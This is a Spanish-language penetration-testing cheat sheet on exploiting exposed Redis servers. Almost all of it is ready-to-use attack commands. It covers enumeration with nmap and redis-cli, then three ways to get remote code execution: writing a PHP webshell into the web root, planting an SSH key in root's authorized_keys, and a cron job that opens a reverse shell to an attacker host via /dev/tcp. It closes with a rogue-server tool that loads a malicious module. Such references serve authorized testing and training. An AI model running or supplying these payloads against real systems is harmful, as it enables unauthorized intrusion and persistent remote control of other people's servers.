---
title: Redis (Remote Dictionary Server - Puerto 6379)
pubDate: '2026-08-26'
---

## ¿Qué es Redis?
**Redis** es un motor de base de datos en memoria, utilizado frecuentemente como caché o gestor de sesiones. Por defecto, muchas instalaciones no requieren contraseña y permiten el acceso total a cualquier usuario que pueda conectar al puerto 6379.

### Riesgos principales
1. **Acceso no autenticado:** Por diseño original, Redis confía en la seguridad perimetral de red.
2. **Escritura arbitraria de ficheros:** Capacidad de volcar la base de datos en cualquier ruta del sistema operativo (`config set dir`).
3. **Ejecución Remota de Código (RCE):** Mediante inyección de WebShells, claves SSH autorizadas o tareas programadas en el cron.

---

## 🔎 1. Enumeración Inicial y Scripts Nmap

```bash
# Scripts NSE de Nmap para Redis
nmap -p 6379 --script=redis-info,redis-brute <TARGET_IP>

# Conectar con el cliente oficial redis-cli (paquete redis-tools)
redis-cli -h <TARGET_IP>

# Si requiere autenticación:
redis-cli -h <TARGET_IP> -a <password>
```

### Comandos de Inspección en `redis-cli`:
```bash
info                # Información general del servidor y versión
info keyspace       # Ver bases de datos activas y cantidad de llaves
select 0            # Seleccionar la base de datos 0
keys *              # Listar todas las llaves (Usar con precaución en BBDD grandes)
get <nombre_llave>   # Leer el valor de una llave específica
```

---

## 🚀 2. Vectores de Explotación (RCE)

### 1. Escritura de WebShell
Si existe un servidor web y conoces la ruta del directorio raíz (ej: `/var/www/html`):
```bash
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save
```

### 2. Inyección de Llave SSH (Authorized Keys)
Si el puerto 22 está abierto y Redis corre como un usuario con carpeta home (ej: `root`):
```bash
# 1. Preparar la llave pública local con saltos de línea para evitar corrupción
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

# 2. Limpiar la DB y cargar la llave
redis-cli -h <TARGET_IP> flushall
cat key.txt | redis-cli -h <TARGET_IP> -x set mi_llave

# 3. Cambiar la ruta de guardado a la carpeta .ssh del usuario
redis-cli -h <TARGET_IP>
> config set dir /root/.ssh/     # O /home/usuario/.ssh/
> config set dbfilename "authorized_keys"
> save

# 4. Acceder por SSH
ssh root@<TARGET_IP> -i ~/.ssh/id_rsa
```

### 3. Tareas Cron (Reverse Shell)
Válido para distribuciones Linux basadas en Debian/Ubuntu:
```bash
config set dir /var/spool/cron/crontabs
config set dbfilename root
set test "\n\n* * * * * /bin/bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1\n\n"
save
```

---

## 🛠️ 3. Herramientas Automáticas

* **Redis-rogue-server:** Automatiza el RCE mediante la carga de un módulo malicioso dinámico (.so) en versiones >= 4.0:
  ```bash
  python3 redis-rogue-server.py --rhost <TARGET_IP> --lhost <IP_ATACANTE>
  ```
